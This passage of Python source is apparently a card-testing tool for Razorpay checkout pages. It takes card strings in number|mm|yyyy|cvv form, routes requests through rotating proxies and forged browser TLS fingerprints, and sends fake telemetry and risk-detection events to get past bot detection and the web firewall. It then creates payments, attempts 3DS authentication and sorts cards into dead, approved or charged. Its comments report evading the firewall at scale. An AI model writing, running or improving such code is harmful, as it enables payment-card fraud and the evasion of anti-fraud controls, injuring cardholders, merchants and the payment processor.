            url = f'{PREFERENCES_URL}?{self._checkout_entity_query()}'
            payload = {
                'query': [{'resource': 'intl_config'}, {'resource': 'paywithpartner'}],
                'query_params': {
                    'device_id': self.tokens.get('rzp_device_id', ''),
                    'rtb_device_id': self._rtb_device_id(),
                    'amount': str(int(self.tokens.get('order_amount', self.amount_paise)) // 100),  # rupees not paise
                    'currency': self._order_currency(),
                    'option_currency': self._order_currency(),
                    'truecaller': False, 'qr_required': True,
                    'checkout_id': self.tokens.get('checkout_id', ''),
                    'library': 'checkoutjs', 'platform': 'browser',
                    'referrer_domain': self._host(),
                    'device_type': self._browser_profile.device_type,
                    'contact': self.tokens.get('contact', ''),
                    'order_id': self.tokens.get('order_id', ''),
                    'payment_link_id': self.tokens.get('payment_link_id', ''),
                },
                'action': 'get',
            }
            resp = await self._request_async('POST', url, self._checkout_api_json_headers(True), json_data=payload)
            data = json.loads(resp)
            shield = data.get('shield_data', {})
            self.tokens['shield_context'] = shield.get('shield_context', '')
            self.tokens['shield_key'] = shield.get('shield_key', '')
            if data.get('key'):
                self.tokens['key_id'] = data['key']
        except Exception as e:
            self._log(f'  preferences skip: {e}')

    async def _lookup_iin_async(self):
        iin = self.card['number'][:9]
        url = f'{API_BASE}/v1/standard_checkout/payment/iin?{self._checkout_entity_query({"iin": iin})}'
        resp = await self._request_async('GET', url, self._checkout_api_json_headers(False), raw=True)
        if resp.status_code >= 400:
            self.forced_outcome = self._outcome_from_api_error(resp.status_code, resp.text)
            return
        data = json.loads(resp.text)
        # IIN response uses type/network/country (NOT card_type/card_network/card_country).
        # The old keys were always empty -> cb_flows sent card.country="" / card.network=""
        # -> BAD_REQUEST_ERROR, which poisoned the payment-create step into SERVER_ERROR.
        self.tokens['card_type'] = str(data.get('type', ''))
        self.tokens['card_network'] = str(data.get('network', ''))
        self.tokens['card_country'] = str(data.get('country', ''))
        self.tokens['bin_currency'] = str(data.get('bin_currency', ''))
        self.tokens['issuer_name'] = str(data.get('issuer_name', ''))
        dcb = data.get('dcc_blacklisted')
        self.tokens['dcc_blacklisted'] = 'true' if dcb else 'false'

    async def _fetch_cb_flows_async(self):
        try:
            url = f'{CB_FLOWS}?{self._checkout_entity_query({}, False)}'
            payload = {
                'identifiers': {
                    'merchant': {'country': 'IN'},
                    'card': {
                        'country': self.tokens.get('card_country', 'US'),
                        'dcc_blacklisted': self.tokens.get('dcc_blacklisted', 'false') == 'true',
                        'network': self.tokens.get('card_network', 'MasterCard'),
                        'currency': self.tokens.get('bin_currency', 'USD'),
                    },
                    'method': 'card',
                    'payment_currency': self._order_currency(),
                },
                'forex_charges': {
                    'amount': self._try_int(self.tokens.get('order_amount', self.amount_paise)),
                    'currency': self._order_currency(),
                    'filters': {'method': 'card'},
                },
            }
            resp = await self._request_async('POST', url, self._checkout_api_json_headers(True),
                                              json_data=payload, raw=True)
            if resp.status_code < 400:
                data = json.loads(resp.text)
                forex_id = _safe_get(data, 'forex_charges', 'id', default='')
                if forex_id:
                    self.tokens['forex_charges_id'] = forex_id
                    self.tokens['currency_request_id'] = forex_id
                    all_cur = data.get('forex_charges', {}).get('all_currencies', {})
                    if all_cur:
                        self.tokens['dcc_currency'] = str(next(iter(all_cur.keys())))
        except Exception as e:
            self._log(f'  cb_flows skip: {e}')

    async def _create_payment_async(self):
        self._ensure_customer_details()
        url = f'{PAYMENT_CREATE}?{self._checkout_auth_query()}'
        kh = (self.tokens.get('keyless_header') or '').strip()
        if kh:
            url += f'&keyless_header={quote(kh)}'
        body = self._build_payment_create_body(include_checkout_id=False)
        resp = await self._request_async('POST', url, self._checkout_api_form_headers(),
                                          data=body, use_proxy=True, raw=True)
        if (resp.status_code >= 400 and 'checkout_id' in resp.text.lower() and
                ('checkout_id is required' in resp.text.lower() or
                 'checkout_id field is invalid' in resp.text.lower() or
                 'property checkout_id is required' in resp.text.lower())):
            body2 = self._build_payment_create_body(include_checkout_id=True)
            resp = await self._request_async('POST', url, self._checkout_api_form_headers(),
                                              data=body2, use_proxy=True, raw=True)
        if resp.status_code >= 400:
            outcome = self._outcome_from_api_error(resp.status_code, resp.text)
            if outcome:
                self.forced_outcome = outcome
            else:
                self.forced_outcome = {
                    'status': 'dead',
                    'message': f'Payment create failed (HTTP {resp.status_code}): {resp.text[:200]}',
                    'reason': 'payment_create_failed',
                }
            return
        try:
            data = json.loads(resp.text)
        except json.JSONDecodeError:
            self.forced_outcome = {
                'status': 'error',
                'message': f'Payment create returned non-JSON: {resp.text[:200]}',
                'reason': 'payment_create_non_json',
            }
            return
        self.tokens['create_response_raw'] = resp.text
        self.tokens['payment_id'] = data.get('payment_id', '')
        self.tokens['payment_type'] = data.get('type', '')
        self.tokens['authenticate_url'] = _safe_get(data, 'request', 'url', default='')

        # Immediate capture detection
        has_pid = bool(data.get('razorpay_payment_id'))
        has_sig = bool(data.get('razorpay_signature'))
        is_captured = (str(data.get('captured', '')).lower() == 'true'
                       or str(data.get('status', '')).lower() == 'captured')
        if has_pid or has_sig or is_captured:
            signals = sum([has_pid, has_sig, is_captured])
            confidence = 'absolute' if signals >= 2 else 'detected'
            self.forced_outcome = {
                'status': 'charged',
                'message': f'Payment Successfully — capture {confidence}',
                'reason': 'charged',
            }

    async def _authenticate_3ds_async(self):
        payment_id = self.tokens.get('payment_id', '')
        if not payment_id:
            raise RuntimeError('payment_id missing')
        pid_clean = payment_id[4:] if payment_id.startswith('pay_') else payment_id
        auth_url_full = f'{API_BASE}/pg_router/v1/payments/{payment_id}/authenticate'
        auth_url_short = f'{API_BASE}/pg_router/v1/payments/{pid_clean}/authenticate'
        auth_headers = self._pg_router_auth_headers()
        try:
            await self._request_async('POST', auth_url_full, auth_headers, data='', raw=True)
        except Exception:
            pass
        await asyncio.sleep(0.4)
        browser_data = {
            'browser[java_enabled]': 'false', 'browser[javascript_enabled]': 'true',
            'browser[timezone_offset]': '0',
            'browser[color_depth]': self.profile.get('color_depth', '24'),
            'browser[screen_width]': self.profile.get('screen_width', '1920'),
            'browser[screen_height]': self.profile.get('screen_height', '1080'),
            'browser[language]': self.profile.get('language', 'en-US'),
            'auth_step': '3ds2Auth',
        }
        bd_qs = '&'.join(f'{quote(k)}={quote(str(v))}' for k, v in browser_data.items())
        resp = await self._request_async('POST', auth_url_short, auth_headers, data=bd_qs, raw=True)
        self.tokens['3ds_auth_response'] = resp.text

    async def _cancel_payment_async(self):
        payment_id = self.tokens.get('payment_id', '')
        if not payment_id:
            raise RuntimeError('payment_id missing')
        url = (f'{API_BASE}/v1/standard_checkout/payments/{quote(payment_id)}/cancel?'
               f'{self._checkout_auth_query()}')
        resp = await self._request_async('GET', url, self._checkout_api_form_headers(), raw=True)
        self.tokens['cancel_response_raw'] = resp.text
        self.tokens['cancel_http_code'] = resp.status_code

    # ── Result builder ─────────────────────────────────────────────────────
    def _build_result(self, elapsed: float) -> dict:
        outcome = self._classify_outcome()
        # Site server-error -> cooldown the SITE for 1h (auto-recovers)
        if outcome.get('reason') == 'rzp_server_error':
            try:
                proxy_manager.set_site_cooldown(self.payment_page_url, hours=1, reason="site_error")
            except Exception:
                pass
        year = self.card.get('expiry_year', '')
        if len(year) == 2:
            year = '20' + year
        card_line = f"{self.card['number']}|{self.card['expiry_month']}|{year}|{self.card['cvv']}"
        amount_paise = int(self.tokens.get('order_amount') or self.amount_paise)
        amount_inr = amount_paise / 100
        # Log only significant outcomes — skip routine dead cards
        if outcome['status'] in ('approved', 'charged', 'error'):
            msg_snippet = outcome.get('message', '')[:100].replace('\n', ' ')
            print(f"[CHECKOUT] status={outcome['status']} reason={outcome.get('reason','?')} "
                  f"payment_id={self.tokens.get('payment_id','none')} "
                  f"time={elapsed:.1f}s msg={msg_snippet} "
                  f"card=...{card_line[-4:]}", file=sys.stderr)

        # Fire lumberjack success/failure — mirrors real browser tracking
        cid = self.tokens.get('checkout_id', '')
        if cid:
            props = {'name': 'payment_create_ajax', 'priority': 'S0',
                     'url': 'payments/create/ajax'}
            if outcome['status'] in ('approved', 'charged'):
                self._send_lumberjack('net:success', cid, {**props, 'status': 200, 'latency': int(elapsed * 1000)})
                self._send_lumberjack('payment_create', cid)
            elif outcome['status'] in ('dead', 'error'):
                self._send_lumberjack('net:failed', cid, {**props, 'status': 400, 'latency': int(elapsed * 1000)})
        return {
            'card': card_line,
            'status': outcome['status'],
            'message': outcome['message'],
            'reason': outcome.get('reason', ''),
            'site': self.payment_page_url,
            'amount_paise': amount_paise,
            'amount_inr': f'₹{amount_inr:.2f}',
            'time_taken': f'{elapsed:.2f}s',
        }

    def _log(self, msg: str):
        if self.verbose:
            print(msg, file=sys.stderr)

    # ── Lumberjack / Human Signal Simulation ───────────────────────────────
    # Lumberjack telemetry — track success/fail rates
    _lj_sent: int = 0
    _lj_failed: int = 0
    _lj_last_log: float = 0.0

    @staticmethod
    def _send_lumberjack(event_name: str, checkout_id: str, properties: dict = None):
        """Fire-and-forget a lumberjack tracking event. Non-blocking.
        Sent directly (not through proxy) — the local test proved this works
        with 0% WAF even at 350 checkouts on a single proxy."""
        last_err = None
        for attempt in range(3):
            try:
                resp = curl_requests.post(LUMBERJACK_URL, json={
                    'mode': 'live',
                    'key': LUMBERJACK_KEY,
                    'events': [{
                        'event': event_name,
                        'properties': properties or {},
                        'checkout_id': checkout_id,
                        'event_version': 'v2',
                    }],
                    'context': {
                        'device_id': checkout_id[:16],
                        'height': 1080,
                        'width': 1920,
                    },
                }, timeout=3)
                RazorpaySession._lj_sent += 1
                # Log status every 50 events
                if RazorpaySession._lj_sent % 50 == 0:
                    total = RazorpaySession._lj_sent + RazorpaySession._lj_failed
                    print(f'[lumberjack] {RazorpaySession._lj_sent} sent, '
                          f'{RazorpaySession._lj_failed} failed '
                          f'({RazorpaySession._lj_sent/max(1,total)*100:.0f}% success)',
                          file=sys.stderr)
                return
            except Exception as e:
                last_err = e
                if attempt < 2:
                    time.sleep(0.25 * (attempt + 1))
        # all retries failed
        RazorpaySession._lj_failed += 1
        if RazorpaySession._lj_failed == 1 or RazorpaySession._lj_failed % 100 == 0:
            print(f'[lumberjack] FAIL #{RazorpaySession._lj_failed}: {type(last_err).__name__}: {last_err}',
                  file=sys.stderr)

    RISK_LJ_URL = 'https://lumberjack.razorpay.com/v2/m/logz'

    @staticmethod
    def _risk_dom(page_url: str):
        """DOM structure a real browser exposes after checkout.js + the
        razorpay-risk-detection bundle load.  sc=scripts, if=iframes, fm=forms."""
        host = urlparse(page_url).hostname or ''
        sc = [
            'https://cdn.razorpay.com/static/analytics/bundle.js',
            'https://cdn.razorpay.com/static/assets/color.js',
            'https://cdn.razorpay.com/static/assets/quilljs/1.3.6/quill.min.js',
            'https://cdn.razorpay.com/static/hosted/wysiwyg.js',
            'https://checkout.razorpay.com/v1/checkout.js',
            'https://cdn.razorpay.com/static/cx/razorpay-risk-detection/bundle.js',
        ]
        ifm = [f'https://api.razorpay.com/v1/checkout/public/card']
        return sc, ifm, []

    def _send_risk_event(self, event_name: str):
        """Replicate one razorpay-risk-detection/bundle.js lumberjack event.

        Sent through the SAME proxy as the checkout so Razorpay correlates the
        risk signal with the payment_create source IP (direct sends are ignored).
        """
        kid = (self.tokens.get('key_id') or '').strip()
        if not kid:
            return
        sc, ifm, fm = RazorpaySession._risk_dom(self.payment_page_url)
        host = urlparse(self.payment_page_url).hostname or ''
        sid = ''.join(random.choice('0123456789abcdef') for _ in range(32))
        now_ms = int(time.time() * 1000)
        payload = {
            'target': 'risk-detection.v1.live',
            'events': [{
                'timestamp': now_ms,
                'source': 'checkoutjs',
                'event_name': f'risk:{event_name}',
                'event_timestamp': now_ms,
                'properties': {
                    'sc': sc, 'if': ifm, 'fm': fm,
                    'v': '1.0.0',
                    'u': self.payment_page_url, 'h': host, 'r': '', 's': sid,
                },
                'event_type': 'risk-detection',
                'version': 'v1',
                'mode': 'live',
            }],
            'addons': {'merchant_id': 'properties.m', 'ip': 'context.ip', 'ua': 'context.ua'},
        }
        url = f'{RazorpaySession.RISK_LJ_URL}?key_id={quote(kid)}'
        for attempt in range(2):
            try:
                req = curl_requests.Session(impersonate=self._impersonation_target)
                if self._proxy_url:
                    req.proxies = {'http': self._proxy_url, 'https': self._proxy_url}
                req.post(url, json=payload, timeout=3)
                return
            except Exception:
                if attempt == 0:
                    time.sleep(0.2)

    def _fire_risk_detection(self):
        """Fire the risk:risk_scan / risk_mutation / risk_scan_complete events.

        These are what razorpay-risk-detection/bundle.js sends; the payment
        engine flags a payment_create with no prior risk signal as a bot (403).
        """
        def _run():
            self._send_risk_event('risk_scan')
            time.sleep(random.uniform(0.15, 0.3))
            self._send_risk_event('risk_mutation')
            time.sleep(random.uniform(0.15, 0.3))
            self._send_risk_event('risk_scan_complete')
        threading.Thread(target=_run, daemon=True).start()

    def _fire_lumberjack_sequence(self):
        """Spawn a background thread that fires lumberjack events in the same
        order a real browser does.  Mimics human interaction to prevent
        behavioral WAF triggers at scale.
        Events are sent directly (not through proxy) — tested at 350
        checkouts with 0% WAF on a single clean proxy."""
        cid = self.tokens.get('checkout_id', '') or ''.join(
            random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
            for _ in range(18))

        def _run():
            lj = self._send_lumberjack
            self._fire_risk_detection()  # risk-detection DOM signals first
            # Card name entry
            lj('change:new_card_name', cid)
            time.sleep(random.uniform(0.05, 0.15))
            lj('behav:add_new_card_continue_clicked', cid, {'cardCountry': 'IN'})
            time.sleep(random.uniform(0.05, 0.15))

            # DCC / cross-border overlay
            dcc = {'base_currency': 'USD', 'base_amount': 100,
                   'pre_selected_currency': None, 'selected_currency': None,
                   'event_type': 'dcc'}
            lj('dcc:overlay:render', cid, dcc)
            lj('dcc:overlay:continue', cid, dcc)

            # AVS billing form
            lj('avs:form:render', cid, {'formType': 'AVS', 'event_type': 'avs'})
            lj('avs:form:country:change', cid, {'formType': 'AVS', 'event_type': 'avs'})
            lj('avs:form:postal_code:change', cid, {'formType': 'AVS', 'event_type': 'avs'})
            lj('avs:form:city:change', cid, {'formType': 'AVS', 'event_type': 'avs'})
            lj('avs:form:line1:change', cid, {'formType': 'AVS', 'event_type': 'avs'})
            lj('avs:form:submit', cid, {
                'formType': 'AVS', 'event_type': 'avs',
                **generate_indian_address(),
            })

            # Card consent + submit (with human hesitation)
            time.sleep(random.uniform(0.5, 1.5))
            lj('submit:card_consent_page', cid)
            lj('submit:card_submit', cid, {
                'method': 'card', 'shieldContext': True,
                'cardCountry': 'IN', 'merchantCountry': 'IN',
            })

            # Network initiated
            lj('net:initiated', cid, {
                'name': 'payment_create_ajax', 'priority': 'S0',
                'url': 'payments/create/ajax',
            })

        threading.Thread(target=_run, daemon=True).start()


# ── Entry point ────────────────────────────────────────────────────────────
def parse_cc(cc_str: str) -> dict:
    parts = [p.strip() for p in cc_str.strip().split('|')]
    if len(parts) < 4:
        raise ValueError('cc must be number|mm|yyyy|cvv')
    number, month, year, cvv = parts[:4]
    number = re.sub(r'\D', '', number)
    if len(number) < 13:
        raise ValueError('invalid card number')
    month = re.sub(r'\D', '', month).zfill(2)
    year = re.sub(r'\D', '', year)
    if len(year) == 2:
        year = '20' + year
    if len(year) != 4:
        raise ValueError('invalid expiry year')
    return {
        'number': number,
        'expiry_month': month,
        'expiry_year': year[-2:],
        'cvv': cvv,
        'name': 'Card Holder',
    }


def parse_proxy(proxy_str: str) -> str:
    """Convert proxy string to curl_cffi-compatible URL.

    Accepts: http://user:pass@host:port | user:pass@host:port | host:port:user:pass | host:port
             | user pass host port | user:pass host:port | host:port user pass | user pass host:port
    """
    proxy_str = proxy_str.strip()
    if not proxy_str:
        raise ValueError('proxy is required')
    if proxy_str.startswith(('http://', 'https://', 'socks5://')):
        return proxy_str
    # user:pass@host:port (curl-style without scheme)
    if '@' in proxy_str:
        return f'http://{proxy_str}'
    # space-separated formats
    if ' ' in proxy_str:
        sp = proxy_str.split()
        # user pass host port (4 parts)
        if len(sp) == 4 and sp[3].isdigit():
            user, pwd, host, port = sp
            return f'http://{quote(user, safe="")}:{quote(pwd, safe="")}@{host}:{port}'
        # host:port user pass (3 parts, first has :port)
        if len(sp) == 3 and ':' in sp[0] and sp[0].rsplit(':', 1)[-1].isdigit():
            hp, user, pwd = sp
            host, port = hp.rsplit(':', 1)
            return f'http://{quote(user, safe="")}:{quote(pwd, safe="")}@{host}:{port}'
        # user pass host:port (3 parts, last has :port)
        if len(sp) == 3 and ':' in sp[2] and sp[2].rsplit(':', 1)[-1].isdigit():
            user, pwd, hp = sp
            host, port = hp.rsplit(':', 1)
            return f'http://{quote(user, safe="")}:{quote(pwd, safe="")}@{host}:{port}'
        # user:pass host:port (2 parts, both colon)
        if len(sp) == 2 and ':' in sp[0] and ':' in sp[1]:
            up, hp = sp
            user, pwd = up.split(':', 1)
            host, port = hp.rsplit(':', 1)
            return f'http://{quote(user, safe="")}:{quote(pwd, safe="")}@{host}:{port}'
        # host port (2 parts, no auth)
        if len(sp) == 2 and sp[1].isdigit():
            return f'http://{sp[0]}:{sp[1]}'
    parts = proxy_str.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port, user, pwd = parts[0], parts[1], ':'.join(parts[2:-1]), parts[-1]
        return f'http://{quote(user, safe="")}:{quote(pwd, safe="")}@{host}:{port}'
    if len(parts) == 2 and parts[1].isdigit():
        return f'http://{parts[0]}:{parts[1]}'
    raise ValueError(f'invalid proxy format: {proxy_str}')


# ── primp-backed session support ──────────────────────────────────────────

def _parse_proxy_for_primp(proxy_str: str) -> str:
    """Convert proxy string to primp-compatible URL (delegates to parse_proxy)."""
    if not proxy_str:
        return None
    try:
        return parse_proxy(proxy_str)
    except ValueError:
        return None


_PRIMP_CANDIDATE_TARGETS = [
    # Chrome-producing primp targets.  chrome_110 falls back to "random" and
    # chrome_133 produces Firefox, so both are excluded.  (primp v1.3.1 target
    # resolution is itself non-deterministic; _verify_primp_targets filters.)
    "chrome_146",  # Chrome on Windows
    "chrome_148",  # Chrome on Android
]

_PRIMP_CHROME_CONFIGS: list[dict] = []


def _verify_primp_targets():
    """Verify which primp targets actually produce Chrome impersonation.
    primp v1.3.1 has unreliable target resolution — some targets silently
    fall back to Safari/Firefox/random.  We test each candidate once at
    import time and keep only the Chrome-producing ones."""
    global _PRIMP_CHROME_CONFIGS, PRIMP_AVAILABLE
    if not PRIMP_AVAILABLE:
        return
    verified = []
    for t in _PRIMP_CANDIDATE_TARGETS:
        try:
            c = primp.Client(impersonate=t, timeout=1)
            ua = c.headers.get('user-agent', '')
            if 'Chrome' in ua:
                verified.append({"impersonate": t})
        except Exception:
            pass
    if len(verified) >= 2:
        _PRIMP_CHROME_CONFIGS = verified
    else:
        # Not enough reliable primp targets — disable primp backend
        PRIMP_AVAILABLE = False
        _PRIMP_CHROME_CONFIGS = []


_verify_primp_targets()


def _pick_primp_config(seed: int = 0) -> dict:
    """Pick a primp browser config, rotated by seed."""
    if not _PRIMP_CHROME_CONFIGS:
        return {"impersonate": "chrome_146"}  # fallback
    return _PRIMP_CHROME_CONFIGS[seed % len(_PRIMP_CHROME_CONFIGS)]


class PrimpCheckoutSession:
    """Thin primp-based checkout session — mirrors RazorpaySession for the
    HTTP layer only.  Reuses all token extraction, URL building, and flow
    logic from RazorpaySession via delegation where possible.

    Only covers the async (high-concurrency) path — sync path stays curl_cffi.
    """

    def __init__(self, payment_page_url: str, card: dict, proxy: str = None,
                 amount_paise: int = DEFAULT_AMOUNT_PAISE,
                 region: str = 'IN', verbose: bool = False,
                 primp_config: dict = None):
        self.payment_page_url = payment_page_url
        self.card = card
        self.proxy = proxy
        self.proxy_url = _parse_proxy_for_primp(proxy) if proxy else None
        self.amount_paise = amount_paise
        self.region = region
        self.verbose = verbose
        self.primp_config = primp_config or _pick_primp_config(0)
        self.tokens: dict = {}
        self.forced_outcome: Optional[dict] = None
        self.last_http_code: int = 0

        # Build primp client — primp sets UA/sec-ch-ua/Accept-* from the
        # impersonation target automatically.  We pass ONLY the proxy config;
        # per-request headers (Sec-Fetch-*, Referer, etc.) go on each call.
        client_kwargs = {
            'impersonate': self.primp_config['impersonate'],
            'timeout': 12,
            'cookie_store': True,
            'verify': False,
        }
        if self.proxy_url:
            client_kwargs['proxy'] = self.proxy_url

        self.client = primp.Client(**client_kwargs)
        self._closed = False

    async def _request(self, method: str, url: str,
                       extra_headers: dict = None) -> str:
        """Async HTTP request via primp (run in thread for non-blocking I/O)."""
        headers = {
            'Accept-Language': 'en-IN,en;q=0.9,hi;q=0.8' if self.region == 'IN' else 'en-US,en;q=0.9',
        }
        if extra_headers:
            headers.update(extra_headers)

        # Run primp call in dedicated thread pool — default executor has
        # only ~28 threads, which bottlenecks catastrophically under load.
        executor = _get_primp_executor()

        def _do_request():
            if method == 'GET':
                return self.client.get(url, headers=headers)
            else:
                return self.client.request(method, url, headers=headers)

        loop = asyncio.get_event_loop()
        resp = await loop.run_in_executor(executor, _do_request)
        self.last_http_code = resp.status_code

        # Safely get response body — primp may fail to decode non-UTF-8 responses
        try:
            resp_body = resp.text
        except Exception:
            try:
                resp_body = resp.content.decode('utf-8', errors='replace')
            except Exception:
                resp_body = str(resp.content)[:1000]

        if self.verbose:
            print(f'[primp] HTTP {resp.status_code} ← {url[:100]}', file=sys.stderr)

        if resp.status_code >= 400:
            body_preview = (resp_body or '(empty)')[:1000]
            waf_action = resp.headers.get('x-amzn-waf-action', 'none')
            request_id = resp.headers.get('x-amzn-RequestId', 'none')
            print(f'\n[WAF_DIAG] HTTP {resp.status_code} | waf={waf_action} | reqid={request_id}'
                  f'\n[WAF_DIAG] URL: {url[:120]}'
                  f'\n[WAF_DIAG] BODY: {body_preview}', file=sys.stderr)
            raise RuntimeError(f'HTTP {resp.status_code} for {url}: {resp_body[:500]}')
        return resp_body

    async def async_close(self):
        """Release primp resources (placeholder — primp Client has no close)."""
        self._closed = True

    def close(self):
        self._closed = True

    async def aclose(self):
        await self.async_close()

    # ── Flow (reuses RazorpaySession's token extraction + URL building) ──

    async def run_async(self) -> dict:
        """Execute 3-step WAF-sensitive checkout flow via primp backend."""
        t0 = time.time()
        try:
            # Step 1: Payment page
            html = await self._request('GET', self.payment_page_url, {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            })
            RazorpaySession._extract_page_tokens_static(html, self.tokens,
                                                          self.payment_page_url)
            await asyncio.sleep(random.uniform(0.2, 0.6))

            # Step 2: checkout.js
            js = await self._request('GET', CHECKOUT_JS_URL, {
                'Accept': '*/*', 'Referer': self.payment_page_url,
                'Sec-Fetch-Dest': 'script', 'Sec-Fetch-Mode': 'no-cors',
                'Sec-Fetch-Site': 'cross-site',
            })
            RazorpaySession._extract_checkout_js_tokens_static(js, self.tokens)
            await asyncio.sleep(random.uniform(0.15, 0.4))

            # Step 3: checkout/public
            pub_url = self._build_checkout_public_url()
            pub_html = await self._request('GET', pub_url, {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Referer': self.payment_page_url,
                'Sec-Fetch-Dest': 'iframe', 'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
            })
            RazorpaySession._extract_session_token_static(pub_html, self.tokens)
            await asyncio.sleep(random.uniform(0.2, 0.6))

            elapsed = time.time() - t0
            return {
                'status': 'ok', 'message': 'primp_3step_pass',
                'time_taken': f'{elapsed:.2f}s',
                'backend': 'primp',
                'primp_target': self.primp_config['impersonate'],
                'tokens': {k: v[:50] if isinstance(v, str) and len(v) > 50 else v
                           for k, v in self.tokens.items()},
            }
        except Exception as e:
            elapsed = time.time() - t0
            return {
                'status': 'error',
                'message': f'primp error: {str(e)[:300]}',
                'time_taken': f'{elapsed:.2f}s',
                'backend': 'primp',
            }

    def _build_checkout_public_url(self) -> str:
        """Build checkout/public URL from extracted tokens."""
        params = []
        for key, param_name in [('traffic_env', 'traffic_env'),
                                 ('commit_hash', 'build'),
                                 ('build_v1', 'build_v1'),
                                 ('build_number', 'build_number')]:
            if self.tokens.get(key):
                params.append(f"{param_name}={self.tokens[key]}")
        url = CHECKOUT_PUBLIC
        if params:
            url += '?' + '&'.join(params)
        return url


# ── Top-level API ──────────────────────────────────────────────────────────


def run_razorpay(cc: str, site: str, proxy: str, verbose: bool = False,
                 amount_paise: int = DEFAULT_AMOUNT_PAISE,
                 per_request_timeout: float = 20.0,
                 browser_profile: Optional[PlatformProfile] = None) -> dict:
    """Run the full Razorpay checkout flow and return result.

    Args:
        cc: Card string in format number|MM|YYYY|CVV
        site: Razorpay payment page URL or @handle
        proxy: Proxy string in format host:port:user:pass
        verbose: Enable verbose logging
        amount_paise: Amount in paise (100 = ₹1.00). Defaults to 100.
    """
    t0 = time.time()
    card_line = ''
    try:
        card = parse_cc(cc)
        year = card['expiry_year']
        if len(year) == 2:
            year = '20' + year
        card_line = f"{card['number']}|{card['expiry_month']}|{year}|{card['cvv']}"
        proxy_url = parse_proxy(proxy)
        site_url = RazorpaySession._normalize_url(site)

        session = RazorpaySession(
            payment_page_url=site_url,
            card=card,
            proxy=proxy_url,
            traffic_env=os.environ.get('RAZORPAY_TRAFFIC_ENV', 'canary'),
            verbose=verbose,
            amount_paise=amount_paise,
            per_request_timeout=per_request_timeout,
            browser_profile=browser_profile,
        )
        return session.run()
    except ValueError as e:
        return {
            'card': card_line or 'unknown',
            'status': 'error',
            'message': str(e),
            'site': site,
            'amount_paise': amount_paise,
            'amount_inr': f'₹{amount_paise/100:.2f}',
            'time_taken': f'{time.time()-t0:.2f}s',
        }
    except Exception as e:
        return {
            'card': card_line or 'unknown',
            'status': 'error',
            'message': str(e)[:500],
            'site': site,
            'amount_paise': amount_paise,
            'amount_inr': f'₹{amount_paise/100:.2f}',
            'time_taken': f'{time.time()-t0:.2f}s',
        }


async def run_razorpay_async(cc: str, site: str, proxy: str, verbose: bool = False,
                              amount_paise: int = DEFAULT_AMOUNT_PAISE,
                              region: str = 'IN',
                              backend: str = 'auto',
                              timeout: float = 90.0,
                              per_request_timeout: float = 20.0,
                              browser_profile: Optional[PlatformProfile] = None) -> dict:
    """Async entry point with multi-backend support.

    backend='auto': weighted via backend_router (wreq/curl_cffi/httpcloak)
    backend='tlshttp': force tlshttp (uTLS/Go-based, different fingerprint pool)
    backend='curl_cffi': force curl_cffi only (JA4 diversity)
    backend='primp': force primp (WAF fallback, BoringSSL via Rust)
    timeout: per-attempt timeout in seconds (default 60s, use 90s for slow proxies)
    per_request_timeout: per-HTTP-request timeout (default 12s, increase for slow proxies)
    """
    import backend_router as _br
    t0 = time.time()
    card_line = ''
    engine = get_diversity_engine()
    cache = get_session_cache()
    ja4_limiter = rate_limiter.get_ja4_limiter()
    made_http_attempt = False  # track if we actually hit the network

    # Parse proxy once — same across all retry attempts
    proxy_url = parse_proxy(proxy)
    proxy_host = proxy_manager.get_proxy_host(proxy)    # hostname only (for pool ops)
    proxy_tag = proxy_manager.get_proxy_tag(proxy)      # host:port (for cache keys)

    # Cross-worker cache sync: in Gunicorn multi-worker mode, each process
    # has its own in-memory cache.  Refresh from shared file before checking
    # so we can reuse tokens cached by other workers.
    if cache is not None:
        cache.refresh_from_file()

    _last_was_waf = False  # track whether previous attempt hit WAF

    for attempt in range(2):  # 2 attempts max — 403 after 2 is definitive
        ja4_config = None
        session = None
        is_primp = False
        try:
            card = parse_cc(cc)
            year = card['expiry_year']
            if len(year) == 2:
                year = '20' + year
            card_line = f"{card['number']}|{card['expiry_month']}|{year}|{card['cvv']}"
            site_url = RazorpaySession._normalize_url(site)

            # Multi-backend selection:
            # - backend='auto': weighted via backend_router (wreq/curl_cffi/httpcloak)
            #   Falls back to curl_cffi if backend_router returns WAF/error
            # - backend='tlshttp': force tlshttp (uTLS/Go-based, different fingerprint pool)
            # - backend='primp': force primp (WAF-only fallback, BoringSSL/Rust)
            # - backend='curl_cffi': force curl_cffi (JA4 diversity, default)
            use_tlshttp = (backend == 'tlshttp')
            use_primp = (backend == 'primp') or (attempt > 0 and PRIMP_AVAILABLE and _last_was_waf)

            if use_tlshttp and attempt == 0:
                # tlshttp backend: uTLS Go-based TLS, different fingerprint pool.
                # Useful as an alternative when curl_cffi fingerprints are blocked.
                # Cookie handling is simpler than curl_cffi — cookies set on the
                # session are passed via the tlshttp client's built-in cookie store.
                from tlshttp_backend import TlsHttpAsyncSession
                tls_session = TlsHttpAsyncSession(
                    proxy_url=proxy_url, timeout=per_request_timeout,
                )
                tls_session.headers.update({
                    'User-Agent': (f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                   f'AppleWebKit/537.36 (KHTML, like Gecko) '
                                   f'Chrome/133.0.0.0 Safari/537.36'),
                    'Accept-Language': 'en-IN,en;q=0.9,hi;q=0.8',
                })
                session = RazorpaySession(
                    payment_page_url=site_url, card=card, proxy=proxy_url,
                    traffic_env=os.environ.get('RAZORPAY_TRAFFIC_ENV', 'canary'),
                    verbose=verbose, amount_paise=amount_paise, region=region,
                    session_cache=cache, per_request_timeout=per_request_timeout,
                    browser_profile=browser_profile,
                )
                session._async_session = tls_session
            elif use_tlshttp:
                # tlshttp only on first attempt — fall back to curl_cffi on retry
                ja4_config = engine.generate(browser='chrome', attempt=attempt)
                if not ja4_limiter.try_consume(ja4_config.impersonate_target):
                    continue
                session = RazorpaySession(
                    payment_page_url=site_url, card=card, proxy=proxy_url,
                    traffic_env=os.environ.get('RAZORPAY_TRAFFIC_ENV', 'canary'),
                    verbose=verbose, amount_paise=amount_paise, region=region,
